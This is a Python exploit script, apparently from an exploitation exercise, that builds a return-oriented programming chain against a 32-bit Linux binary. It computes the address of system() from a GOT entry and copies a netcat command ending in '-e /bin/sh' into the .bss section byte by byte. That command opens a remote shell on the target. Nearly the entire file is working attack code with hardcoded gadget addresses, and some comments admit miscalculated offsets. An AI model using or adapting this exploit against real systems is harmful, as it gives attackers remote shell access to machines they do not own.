#!/usr/bin/python
import socket
import struct
from time import sleep

def create_rop():
    '''
    got not randomized. got dereferencing.
    '''
    # in this case you can NOT stack pivot because descriptors are closed 
    # and no more reads can be done (to place data un bss)!
    payload = wp_to_mem()
    payload += real_rop()
    #payload += unicodefy(struct.pack('<L', 0x8049b4f))
    return payload

def unicodefy(int_str):
    uc = '\u{0:02x}{1:02x}\u{2:02x}{3:02x}'.format(ord(int_str[0]),
                                           ord(int_str[1]),
                                           ord(int_str[2]),
                                           ord(int_str[3]),
                                          )
    return uc

def real_rop():
    '''
    got dereference.
    '''
    '''
    (gdb) p system --> 0xb75bab20 <__libc_system>
    (gdb) p strlen --> 0xb75f42c0 <strlen>
    (gdb) p/x 0xb75bab20-0xb75f42c0 --> $5 = 0xfffc6860
    (gdb) p/x strlen+0xfffc6860 --> $6 = 0xb75bab20 => &system
    or
    objdump -T /lib/i386-linux-gnu/libc-2.13.so  | egrep 'system|strlen'
    and use gdb to sub compute offset
    '''
    func_offset = 0xfffc6860 - 0x69f0 # the offset was not well computed...
    # readelf -S <bin>, objdump -h <bin>
    bss_section = 0x0804bdc0
    # readelf -r <bin>, objdump -R <bin>
    strlen_got = 0x0804bd68 # random funct to calc system addr through offset
    #ropeme
    pop_eax = 0x8049b4f # pop eax; add esp, 0x5c
    pop_ebx = 0x804a2d4 # pop ebx;
    calc_addr = 0x804a2ae # add eax,[ebx-0xb8a0008];add esp,0x4;pop ebx;pop ebp
    call_eax = 0x804942f # call eax; leave

    payload = unicodefy(struct.pack('<L', pop_eax))
    payload += unicodefy(struct.pack('<L', func_offset))
    payload += 'A' * 0x5c
    payload += unicodefy(struct.pack('<L', pop_ebx))
    payload += unicodefy(struct.pack('<L', strlen_got+0xb8a0008))
    payload += unicodefy(struct.pack('<L', calc_addr))
    payload += 'A' * 12
    payload += unicodefy(struct.pack('<L', call_eax))
    payload += unicodefy(struct.pack('<L', bss_section))
    payload += unicodefy(struct.pack('<L', 0xdeadbeef))
    payload += unicodefy(struct.pack('<L', bss_section))

    return payload

def wp_to_mem():
    '''
    This shit will write 'nc 127.0.0.1 1111' to a writable section 
    byte per byte, using bytes already in the executable memory.
    Ugly code, but works like a charm!
    (ugliest function ever written? lol)
    '''
    # pop esi; pop edi; pop ebp
    three_pop = 0x8049205
    # readelf -S <bin>, objdump -h <bin>
    bss_section = 0x0804bdc0
    memcpy_plt = 0x08048e60 # payload transmission byte-per-byte
    # nc 127.0.0.1 1111 - char addr per addr
    n_char = 0x804813e
    c_char = 0x8048354
    space_char = 0x804802a
    one_char = 0x8048414
    two_char = 0x8048145
    seven_char = 0x80484f4
    point_char = 0x8048141
    zero_char = 0x80482a4
    # nc.traditional extra chars
    t_char = 0x80480f6
    r_char = 0x804861c
    a_char = 0x80481ca
    d_char = 0x8048117
    i_char = 0x804813d
    o_char = 0x8048364
    l_char = 0x804813c
    # -e /bin/sh
    colon_char = 0x804813b
    e_char = 0x8048626
    slash_char = 0x8048134
    b_char = 0x8048607
    i_char = 0x8048136
    s_char = 0x8048142
    h_char = 0x804865f

    payload = unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section))
    payload += unicodefy(struct.pack('<L', n_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x1))
    payload += unicodefy(struct.pack('<L', c_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    # nc.traditional changes
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x2))
    payload += unicodefy(struct.pack('<L', point_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x3))
    payload += unicodefy(struct.pack('<L', t_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x4))
    payload += unicodefy(struct.pack('<L', r_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x5))
    payload += unicodefy(struct.pack('<L', a_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x6))
    payload += unicodefy(struct.pack('<L', d_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x7))
    payload += unicodefy(struct.pack('<L', i_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x8))
    payload += unicodefy(struct.pack('<L', t_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x9))
    payload += unicodefy(struct.pack('<L', i_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0xa))
    payload += unicodefy(struct.pack('<L', o_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0xb))
    payload += unicodefy(struct.pack('<L', n_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0xc))
    payload += unicodefy(struct.pack('<L', a_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0xd))
    payload += unicodefy(struct.pack('<L', l_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    # end changes
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0xe))
    payload += unicodefy(struct.pack('<L', space_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0xf))
    payload += unicodefy(struct.pack('<L', one_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x10))
    payload += unicodefy(struct.pack('<L', two_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x11))
    payload += unicodefy(struct.pack('<L', seven_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x12))
    payload += unicodefy(struct.pack('<L', point_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x13))
    payload += unicodefy(struct.pack('<L', zero_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x14))
    payload += unicodefy(struct.pack('<L', point_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x15))
    payload += unicodefy(struct.pack('<L', zero_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x16))
    payload += unicodefy(struct.pack('<L', point_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x17))
    payload += unicodefy(struct.pack('<L', one_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x18))
    payload += unicodefy(struct.pack('<L', space_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x19))
    payload += unicodefy(struct.pack('<L', one_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x1a))
    payload += unicodefy(struct.pack('<L', one_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x1b))
    payload += unicodefy(struct.pack('<L', one_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x1c))
    payload += unicodefy(struct.pack('<L', one_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    # nc.tradition change
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x1d))
    payload += unicodefy(struct.pack('<L', space_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x1e))
    payload += unicodefy(struct.pack('<L', colon_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x1f))
    payload += unicodefy(struct.pack('<L', e_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x20))
    payload += unicodefy(struct.pack('<L', space_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x21))
    payload += unicodefy(struct.pack('<L', slash_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x22))
    payload += unicodefy(struct.pack('<L', b_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x23))
    payload += unicodefy(struct.pack('<L', i_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x24))
    payload += unicodefy(struct.pack('<L', n_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x25))
    payload += unicodefy(struct.pack('<L', slash_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x26))
    payload += unicodefy(struct.pack('<L', s_char))
    payload += unicodefy(struct.pack('<L', 0x1))
    payload += unicodefy(struct.pack('<L', memcpy_plt))
    payload += unicodefy(struct.pack('<L', three_pop))
    payload += unicodefy(struct.pack('<L', bss_section+0x27))
    payload += unicodefy(struct.pack('<L', h_char))
    payload += unicodefy(struct.pack('<L', 0x2)) # null byte
    #
    return payload

